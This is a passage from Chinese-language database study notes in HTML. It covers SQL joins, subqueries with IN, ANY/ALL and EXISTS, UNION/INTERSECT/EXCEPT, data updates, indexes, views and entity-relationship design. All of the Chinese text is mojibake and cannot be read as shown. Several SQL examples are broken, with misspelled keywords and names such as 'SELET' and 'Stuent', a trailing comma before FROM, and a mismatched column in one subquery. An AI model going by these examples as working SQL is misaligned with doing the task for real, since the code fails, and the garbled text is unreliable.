å·¦å¤–è¿æ¥,å³å¤–è¿æ¥,å®Œå…¨å¤–è¿æ¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade <span class="keyword">from</span> Student <span class="keyword">left</span> (<span class="keyword">outer</span>) <span class="keyword">join</span> SC <span class="keyword">on</span> Student.Sno<span class="operator">=</span>SC.Sno</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Stuent.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade <span class="keyword">from</span> SC <span class="keyword">right</span> <span class="keyword">join</span> Student <span class="keyword">ON</span> Student.Sno<span class="operator">=</span>SC.Sno</span><br></pre></td></tr></table></figure><h4 id="3-4-4-åµŒå¥—æŸ¥è¯¢"><a href="#3-4-4-åµŒå¥—æŸ¥è¯¢" class="headerlink" title="3.4.4 åµŒå¥—æŸ¥è¯¢"></a>3.4.4 åµŒå¥—æŸ¥è¯¢</h4><p>ä¸€ä¸ªSELECT-FROM-WHERE è¯­å¥ç§°ä¸ºä¸€ä¸ªæŸ¥è¯¢å—</p><p>å°†ä¸€ä¸ªæŸ¥è¯¢å—åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢å—çš„WHEREå­å¥æˆ–HAVINGçŸ­è¯­çš„æ¡ä»¶ä¸­çš„æŸ¥è¯¢ç§°ä¸ºåµŒå¥—æŸ¥è¯¢</p><p>å­æŸ¥è¯¢ä¸èƒ½ç”¨ORDER BY å­å¥!</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname<span class="operator">/</span><span class="operator">/</span>å¤–å±‚æŸ¥è¯¢<span class="operator">/</span>çˆ¶æŸ¥è¯¢</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">IN</span> </span><br><span class="line">( SELET Sno <span class="keyword">FROM</span> SC<span class="operator">/</span><span class="operator">/</span>å†…å±‚æŸ¥è¯¢<span class="operator">/</span>å­æŸ¥è¯¢ </span><br><span class="line">     <span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;2&#x27;</span>) </span><br></pre></td></tr></table></figure><p>å¼•å‡ºå­æŸ¥è¯¢çš„è°“è¯: </p><ol><li>å¸¦æœ‰INè°“è¯çš„å­æŸ¥è¯¢</li><li>å¸¦æœ‰æ¯”è¾ƒè¿ç®—ç¬¦çš„å­æŸ¥è¯¢</li><li>å¸¦æœ‰ALL(SOME) æˆ–ANYè°“è¯çš„å­æŸ¥è¯¢</li><li>å¸¦æœ‰EXISTSè°“è¯çš„å­æŸ¥è¯¢</li></ol><h5 id="1-å¸¦æœ‰INè°“è¯çš„å­æŸ¥è¯¢"><a href="#1-å¸¦æœ‰INè°“è¯çš„å­æŸ¥è¯¢" class="headerlink" title="1.å¸¦æœ‰INè°“è¯çš„å­æŸ¥è¯¢"></a>1.å¸¦æœ‰INè°“è¯çš„å­æŸ¥è¯¢</h5><p>INå’ŒNOT IN å­æŸ¥è¯¢åªèƒ½è¿”å›ä¸€åˆ—æ•°æ®</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> CustomerInfo <span class="keyword">WHERE</span> æ‰€åœ¨çœå¸‚ <span class="keyword">IN</span> (<span class="keyword">SELECT</span> æ‰€åœ¨çœå¸‚ <span class="keyword">FROM</span> Customer <span class="keyword">WHERE</span> å®¢æˆ·å§“å<span class="operator">=</span><span class="string">&#x27;å¼ å°æ—&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="2-å¸¦æœ‰æ¯”è¾ƒè¿ç®—ç¬¦çš„å­æŸ¥è¯¢"><a href="#2-å¸¦æœ‰æ¯”è¾ƒè¿ç®—ç¬¦çš„å­æŸ¥è¯¢" class="headerlink" title="2.å¸¦æœ‰æ¯”è¾ƒè¿ç®—ç¬¦çš„å­æŸ¥è¯¢"></a>2.å¸¦æœ‰æ¯”è¾ƒè¿ç®—ç¬¦çš„å­æŸ¥è¯¢</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OrderList <span class="keyword">WHERE</span> å•†å“ç¼–å·<span class="operator">=</span><span class="string">&#x27;10010001&#x27;</span> <span class="keyword">AND</span> æ•°é‡ <span class="operator">&gt;</span> (<span class="keyword">SELECT</span> <span class="built_in">AVG</span>(æ•°é‡) <span class="keyword">FROM</span> OrderList <span class="keyword">WHERE</span> å•†å“ç¼–å·<span class="operator">=</span><span class="string">&#x27;10010001&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="3-å¸¦æœ‰ALL-SOME-æˆ–ANYè°“è¯çš„å­æŸ¥è¯¢"><a href="#3-å¸¦æœ‰ALL-SOME-æˆ–ANYè°“è¯çš„å­æŸ¥è¯¢" class="headerlink" title="3.å¸¦æœ‰ALL(SOME) æˆ–ANYè°“è¯çš„å­æŸ¥è¯¢"></a>3.å¸¦æœ‰ALL(SOME) æˆ–ANYè°“è¯çš„å­æŸ¥è¯¢</h5><p>ALLæŒ‡å®šè¡¨è¾¾å¼è¦ä¸å­æŸ¥è¯¢ç»“æœé›†ä¸­åœ°æ¯ä¸ªå€¼éƒ½è¿›è¡Œæ¯”è¾ƒ,å½“è¡¨è¾¾å¼æ¯ä¸ªå€¼éƒ½æ»¡è¶³æ¯”è¾ƒå…³ç³»æ—¶,æ‰è¿”å›TRUE,å¦åˆ™è¿”å›FALSE</p><p>ANYä¸SOMEçš„é™åˆ¶å«ä¹‰ç›¸åŒ,é€šå¸¸é‡‡ç”¨ANY,è¡¨ç¤ºè¡¨è¾¾å¼åªè¦ä¸å­æŸ¥è¯¢ç»“æœé›†ä¸­çš„æŸä¸ªå€¼æ»¡è¶³æ¯”è¾ƒå…³ç³»å¼å°±è¿”å›TRUE,å¦åˆ™è¿”å›FLASE</p><p>æŸ¥è¯¢æ¯”æŸä¸ªé£Ÿå“ç±»çš„å•†å“å•ä»·ä½çš„å•†å“ä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> å•†å“ç±»åˆ«<span class="operator">&lt;&gt;</span><span class="string">&#x27;é£Ÿå“&#x27;</span> <span class="keyword">AND</span> å•ä»·<span class="operator">&lt;</span><span class="keyword">ANY</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">SELECT</span> å•ä»· <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> é£Ÿå“ç±»åˆ«<span class="operator">=</span><span class="string">&#x27;é£Ÿå“&#x27;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>ANYåœ¨å­æŸ¥è¯¢è¿”å›ç»“æœä¸ºNULLæ—¶,è¡¨è¾¾å¼ä¸ºFALSE</p><p>ALLåœ¨å­æŸ¥è¯¢è¿”å›ç»“æœä¸ºNULLæ—¶,è¡¨è¾¾å¼ä¸ºTRUE</p><h5 id="4-å¸¦æœ‰EXISTSè°“è¯çš„å­æŸ¥è¯¢"><a href="#4-å¸¦æœ‰EXISTSè°“è¯çš„å­æŸ¥è¯¢" class="headerlink" title="4.å¸¦æœ‰EXISTSè°“è¯çš„å­æŸ¥è¯¢"></a>4.å¸¦æœ‰EXISTSè°“è¯çš„å­æŸ¥è¯¢</h5><p>EXISTSè°“è¯ç”¨äºæµ‹è¯•å­æŸ¥è¯¢çš„ç»“æœæ˜¯å¦ä¸ºç©ºè¡¨,è‹¥å­æŸ¥è¯¢ç»“æœé›†ä¸ä¸ºç©º,EXISTSè¿”å›TURE,å¦åˆ™è¿”å›FALSE</p><p>æŸ¥æ‰¾è®¢è´­äº†ç¼–å·ä¸ºâ€10010001â€å•†å“çš„å®¢æˆ·å§“å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> å®¢æˆ·å§“å <span class="keyword">FROM</span> CustomerInfo a <span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OrderList b <span class="keyword">WHERE</span> b.å®¢æˆ·ç¼–å·<span class="operator">=</span>a.å®¢æˆ·ç¼–å· <span class="keyword">AND</span></span><br><span class="line">    b.å•†å“ç¼–å·<span class="operator">=</span><span class="string">&#x27;10010001&#x27;</span>   </span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020800669.png"></p><p>æŸ¥è¯¢é€‰ä¿®äº†å…¨éƒ¨è¯¾ç¨‹çš„å­¦ç”Ÿå§“å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> </span><br><span class="line">(</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="keyword">FROM</span> Course</span><br><span class="line">    <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">    (</span><br><span class="line">            <span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line">                <span class="keyword">FROM</span> SC</span><br><span class="line">                <span class="keyword">WHERE</span> Sno<span class="operator">=</span>Student.Sno <span class="keyword">AND</span></span><br><span class="line">                Cno<span class="operator">=</span>Course.Cno</span><br><span class="line">            )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="3-4-5é›†åˆæŸ¥è¯¢"><a href="#3-4-5é›†åˆæŸ¥è¯¢" class="headerlink" title="3.4.5é›†åˆæŸ¥è¯¢"></a>3.4.5é›†åˆæŸ¥è¯¢</h4><p>é›†åˆæ“ä½œä¸»è¦åŒ…æ‹¬: å¹¶,äº¤,å·®</p><h5 id="1-å¹¶"><a href="#1-å¹¶" class="headerlink" title="1.å¹¶"></a>1.å¹¶</h5><p>ä½¿ç”¨UNIONæˆ–OR</p><p>æŸ¥è¯¢è®¡ç®—æœºç§‘å­¦ç³»çš„å­¦ç”ŸåŠå¹´é¾„ä¸å¤§äº19å²çš„å­¦ç”Ÿ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> </span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sage<span class="operator">&lt;</span><span class="number">19</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> <span class="keyword">OR</span> Sage<span class="operator">&lt;=</span><span class="number">19</span></span><br></pre></td></tr></table></figure><h5 id="2-äº¤"><a href="#2-äº¤" class="headerlink" title="2.äº¤"></a>2.äº¤</h5><p>ä½¿ç”¨INTERSECT</p><p>æŸ¥è¯¢å•ä»·å°äº50çš„å•†å“ä¸åº“å­˜é‡å¤§äº20çš„å•†å“çš„äº¤é›†</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> å•ä»·<span class="operator">&lt;</span><span class="number">50</span></span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> åº“å­˜é‡<span class="operator">&gt;</span><span class="number">20</span></span><br></pre></td></tr></table></figure><h5 id="3-å·®"><a href="#3-å·®" class="headerlink" title="3.å·®"></a>3.å·®</h5><p>ä½¿ç”¨EXCEPT</p><p>æŸ¥è¯¢å•ä»·å°äº50çš„å•†å“ä¸åº“å­˜é‡å¤§äº20çš„å•†å“çš„å·®é›†</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> å•ä»·<span class="operator">&lt;</span><span class="number">50</span></span><br><span class="line"><span class="keyword">EXCEPT</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> åº“å­˜é‡<span class="operator">&gt;</span><span class="number">20</span></span><br></pre></td></tr></table></figure><h5 id="4-é›†åˆæŸ¥è¯¢æ’åº"><a href="#4-é›†åˆæŸ¥è¯¢æ’åº" class="headerlink" title="4.é›†åˆæŸ¥è¯¢æ’åº"></a>4.é›†åˆæŸ¥è¯¢æ’åº</h5><p>ORDER BY å­å¥åªèƒ½ç”¨äºå¯¹æœ€ç»ˆæŸ¥è¯¢ç»“æœæ’åº</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdep<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sage<span class="operator">&lt;=</span><span class="number">19</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Sno</span><br></pre></td></tr></table></figure><h3 id="3-5æ•°æ®æ›´æ–°"><a href="#3-5æ•°æ®æ›´æ–°" class="headerlink" title="3.5æ•°æ®æ›´æ–°"></a>3.5æ•°æ®æ›´æ–°</h3><p>æ’å…¥è¯­å¥:INSERT</p><p>ä¸¤ç§æ’å…¥æ–¹å¼:1.æ’å…¥å•ä¸ªå…ƒç¥–2.æ’å…¥å­æŸ¥è¯¢ç»“æœ</p><h5 id="1-æ•°æ®æ’å…¥"><a href="#1-æ•°æ®æ’å…¥" class="headerlink" title="1.æ•°æ®æ’å…¥"></a>1.æ•°æ®æ’å…¥</h5><p>1.æ’å…¥å…ƒç¥–</p><p>æ’å…¥ä¸€æ¡é€‰è¯¾è®°å½•(â€˜95020â€™,â€™1â€™)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC(Sno,Cno) <span class="keyword">VALUES</span>(<span class="string">&#x27;95020&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>2.æ’å…¥å­æŸ¥è¯¢ç»“æœ</p><p>å¯¹æ¯ä¸€ä¸ªç³»,æ±‚å­¦ç”Ÿçš„å¹³å‡å¹´é¾„,å¹¶æŠŠç»“æœå­˜å…¥æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*ç¬¬ä¸€æ­¥å»ºè¡¨*/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Deptage</span><br><span class="line">(</span><br><span class="line">Sdept <span class="type">CHAR</span>(<span class="number">15</span>) <span class="keyword">PRIMARY</span> KEY, <span class="comment">/*ç³»å*/</span></span><br><span class="line">    Avgage <span class="type">SMALLINT</span>  <span class="comment">/*å­¦ç”Ÿå¹³å‡å¹´é¾„*/</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">/*ç¬¬äºŒæ­¥æ’å…¥æ•°æ®*/</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Deptage(Sdept,Avgage)</span><br><span class="line"><span class="keyword">SELECT</span> Sdept,<span class="built_in">AVG</span>(Sage) <span class="keyword">FROM</span> Student <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sdept</span><br></pre></td></tr></table></figure><h5 id="2-æ•°æ®ä¿®æ”¹"><a href="#2-æ•°æ®ä¿®æ”¹" class="headerlink" title="2.æ•°æ®ä¿®æ”¹"></a>2.æ•°æ®ä¿®æ”¹</h5><p>å°†æ‰€æœ‰å­¦ç”Ÿçš„å¹´é¾„å¢åŠ 1å²</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> Student <span class="keyword">SET</span> Sage<span class="operator">=</span>Sage<span class="operator">+</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>å°†è®¡ç®—æœºç³»å…¨ä½“å­¦ç”Ÿçš„æˆç»©ç½®é›¶</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> SC <span class="keyword">SET</span> Grade<span class="operator">=</span><span class="number">0</span> <span class="keyword">WHERE</span> Sno <span class="keyword">IN</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="3-æ•°æ®åˆ é™¤"><a href="#3-æ•°æ®åˆ é™¤" class="headerlink" title="3.æ•°æ®åˆ é™¤"></a>3.æ•°æ®åˆ é™¤</h5><p>DELETEåˆ é™¤çš„æ˜¯è¡¨ä¸­çš„æ•°æ®,ä¸æ˜¯è¡¨çš„ç»“æ„.</p><p>DROPåˆ é™¤çš„ä¸ä»…æ˜¯æ ‡çš„å†…å®¹è¿˜æœ‰è¡¨çš„å®šä¹‰</p><p>åˆ é™¤å•†å“è®¢è´­æ•°æ®åº“çš„CustomerInfoè¡¨ä¸­ç¼–å·ä¸º100007çš„å®¢æˆ·ä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> CustomerInfo <span class="keyword">WHERE</span> å®¢æˆ·ç¼–å·<span class="operator">=</span><span class="string">&#x27;100007&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="4-ç´¢å¼•å®šä¹‰"><a href="#4-ç´¢å¼•å®šä¹‰" class="headerlink" title="4.ç´¢å¼•å®šä¹‰"></a>4.ç´¢å¼•å®šä¹‰</h5><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020833197.png" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020835802.png" style="zoom:67%;" /><p>åˆ é™¤ç´¢å¼•: DROP INDEX &lt;åŸºæœ¬è¡¨å&gt;.&lt;ç´¢å¼•å&gt;</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> INDEX CustomerInfo.CustomerID_ind</span><br></pre></td></tr></table></figure><h3 id="3-6è§†å›¾"><a href="#3-6è§†å›¾" class="headerlink" title="3.6è§†å›¾"></a>3.6è§†å›¾</h3><h5 id="1-è§†å›¾å®šä¹‰"><a href="#1-è§†å›¾å®šä¹‰" class="headerlink" title="1.è§†å›¾å®šä¹‰"></a>1.è§†å›¾å®šä¹‰</h5><p>ä»ä¸€ä¸ªæˆ–å¤šä¸ªåŸºæœ¬è¡¨(æˆ–è§†å›¾)å¯¼å‡ºçš„è¡¨ã€‚è§†å›¾æ˜¯ä¸€ä¸ªè™šè¡¨ï¼Œæ•°æ®åº“ä¸­å€¼å­˜å‚¨è§†å›¾çš„å®šä¹‰ã€‚</p><p>1.åˆ›å»ºè§†å›¾Customer_NJview,å…¶å†…å®¹ä¸ºæ±Ÿè‹å—äº¬çš„å®¢æˆ·ä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Customer_NJview</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> CustomerInfo</span><br><span class="line"><span class="keyword">WHERE</span> æ‰€åœ¨çœå¸‚<span class="operator">=</span><span class="string">&#x27;æ±Ÿè‹å—äº¬&#x27;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºè§†å›¾OrderList_NJview å…¶å†…å®¹ä¸ºæ±Ÿè‹å—äº¬çš„å®¢æˆ·ç¼–å·åŠå…¶è®¢è´­çš„å•†å“ç¼–å·</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> OrderList_NJview</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> a.<span class="operator">*</span>,å•†å“ç¼–å·</span><br><span class="line"><span class="keyword">FROM</span> CustomerInfo a,OrderList b</span><br><span class="line"><span class="keyword">WHERE</span> a.æ‰€åœ¨çœå¸‚<span class="operator">=</span><span class="string">&#x27;æ±Ÿè‹å—äº¬&#x27;</span> <span class="keyword">AND</span> a.å®¢æˆ·ç¼–å·<span class="operator">=</span>b.å®¢æˆ·ç¼–å·</span><br></pre></td></tr></table></figure><p>åˆ›å»ºâ€æ±Ÿè‹å—äº¬â€è®¢è´­äº†ç¼–å·ä¸º10010001å•†å“çš„æ‰€æœ‰å®¢æˆ·çš„å®¢æˆ·ç¼–å·ã€å®¢æˆ·å§“åè§†å›¾Order_NJView_2</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Order_NJView_2(å®¢æˆ·ç¼–å·,å®¢æˆ·å§“å)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> å®¢æˆ·ç¼–å·,å®¢æˆ·å§“å</span><br><span class="line"><span class="keyword">FROM</span> OrderList_NJview</span><br><span class="line"><span class="keyword">WHERE</span> å•†å“ç¼–å·<span class="operator">=</span><span class="string">&#x27;10010001&#x27;</span></span><br></pre></td></tr></table></figure><p>2.ä¿®æ”¹è§†å›¾Order_NJView_2,ä½¿å…¶å†…å®¹æ˜¯é€‰è´­äº†ç¼–å·ä¸º30010001çš„æ‰€æœ‰æ±Ÿè‹å—äº¬å®¢æˆ·çš„å®¢æˆ·ç¼–å·,å®¢æˆ·å§“å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">VIEW</span> Order_NJView_2</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> å®¢æˆ·ç¼–å·,å®¢æˆ·å§“å</span><br><span class="line"><span class="keyword">FROM</span> OrderList_NJView</span><br><span class="line"><span class="keyword">WHERE</span> å•†å“ç¼–å·<span class="operator">=</span><span class="string">&#x27;30010001&#x27;</span></span><br></pre></td></tr></table></figure><p>3.åˆ é™¤è§†å›¾OrderList_NJView</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> OrderList_NJView</span><br></pre></td></tr></table></figure><h5 id="2-è§†å›¾æŸ¥è¯¢"><a href="#2-è§†å›¾æŸ¥è¯¢" class="headerlink" title="2.è§†å›¾æŸ¥è¯¢"></a>2.è§†å›¾æŸ¥è¯¢</h5><p>æŸ¥è¯¢è§†å›¾ä¸æŸ¥è¯¢è¡¨ç›¸åŒ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;IS&#x27;</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¿¡æ¯ç³»å­¦ç”Ÿè§†å›¾ä¸­æ‰¾å‡ºå¹´é¾„å°äº20å²çš„å­¦ç”Ÿ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sage,</span><br><span class="line"><span class="keyword">FROM</span> IS_Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage<span class="operator">&lt;</span><span class="number">20</span></span><br></pre></td></tr></table></figure><h5 id="3-è§†å›¾æ›´æ–°"><a href="#3-è§†å›¾æ›´æ–°" class="headerlink" title="3.è§†å›¾æ›´æ–°"></a>3.è§†å›¾æ›´æ–°</h5><p>1.æ’å…¥æ•°æ®:INSERT</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> CInfo_JS(å®¢æˆ·ç¼–å·,å®¢æˆ·å§“å,æ€§åˆ«,å‡ºç”Ÿæ—¥æœŸ,æ‰€åœ¨çœå¸‚) <span class="keyword">VALUES</span>(<span class="string">&#x27;100008&#x27;</span>,<span class="string">&#x27;èµµå¹³&#x27;</span>,<span class="string">&#x27;å¥³&#x27;</span>,<span class="string">&#x27;1993-5-19&#x27;</span>,<span class="string">&#x27;æ±Ÿè‹å—äº¬&#x27;</span>)</span><br></pre></td></tr></table></figure><p>2.ä¿®æ”¹æ•°æ®:INSERT</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> IS_Student <span class="keyword">SET</span> Sname<span class="operator">=</span><span class="string">&#x27;åˆ˜æ™¨&#x27;</span> <span class="keyword">WHERE</span> Sno<span class="operator">=</span><span class="string">&#x27;95002&#x27;</span></span><br></pre></td></tr></table></figure><p>3.åˆ é™¤æ•°æ®:DELETE</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> CInfo_JS <span class="keyword">WHERE</span> å®¢æˆ·ç¼–å·<span class="operator">=</span><span class="string">&#x27;100008&#x27;</span></span><br></pre></td></tr></table></figure><p>4.ä¸ºäº†é˜²æ­¢ç”¨æˆ·é€šè¿‡å¯¹è§†å›¾æ•°æ®è¿›è¡Œæ›´æ–°æ—¶,å¯¹ä¸å±äºè¯•å›¾èŒƒå›´å†…çš„åŸºæœ¬è¡¨æ•°æ®è¿›è¡Œæ“ä½œ,å¯åœ¨å®šä¹‰è§†å›¾æ—¶åŠ ä¸ŠWITH CHECK OPTION</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student_1</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;IS&#x27;</span></span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">CHECK</span> OPTION</span><br></pre></td></tr></table></figure><p>è§†å›¾æ›´æ–°</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020857780.png" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020858791.png" style="zoom:67%;" /><h2 id="4-æ•°æ®åº“è®¾è®¡"><a href="#4-æ•°æ®åº“è®¾è®¡" class="headerlink" title="4.æ•°æ®åº“è®¾è®¡"></a>4.æ•°æ®åº“è®¾è®¡</h2><p>1.ä¿¡æ¯ç³»ç»Ÿæ˜¯æä¾›ä¿¡æ¯ã€è¾…åŠ©äººä»¬å¯¹ç¯å¢ƒè¿›è¡Œæ§åˆ¶å’Œè¿›è¡Œå†³ç­–çš„ç³»ç»Ÿ<br>æ•°æ®åº“æ˜¯ä¿¡æ¯ç³»ç»Ÿçš„æ ¸å¿ƒå’ŒåŸºç¡€ã€‚</p><p>2.æ•°æ®åº“çš„è®¾è®¡çš„ç›®æ ‡ï¼šä¸ºç”¨æˆ·å’Œå„ç§åº”ç”¨ç³»ç»Ÿæä¾›ä¸€ä¸ªä¿¡æ¯åŸºç¡€è®¾æ–½å’Œé«˜æ•ˆç‡çš„è¿è¡Œç¯å¢ƒï¼ŒåŒ…æ‹¬ï¼š<br>æ•°æ®çš„å­˜å‚¨æ•ˆç‡ï¼Œå­˜å‚¨ç©ºé—´åˆ©ç”¨ç‡ï¼Œç³»ç»Ÿè¿è¡Œç®¡ç†æ•ˆç‡</p><p>3.æ•°æ®åº“è®¾è®¡çš„åŸºæœ¬æ­¥éª¤</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020907265.png" style="zoom: 67%;" /><p>4.E-Rå›¾åƒå…³ç³»æ¨¡å¼çš„è½¬æ¢</p><p>a. 1:1 è”ç³»</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020910218.png" style="zoom:67%;" /><p>ä¾‹:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020911768.png" style="zoom:67%;" /><p>b. 1:Nè”ç³»</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020912509.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020918872.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020918963.png"></p><p>c.M:Nè”ç³»</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020919865.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020919008.png"></p><h2 id="5-å…³ç³»è§„èŒƒåŒ–ç†è®º"><a 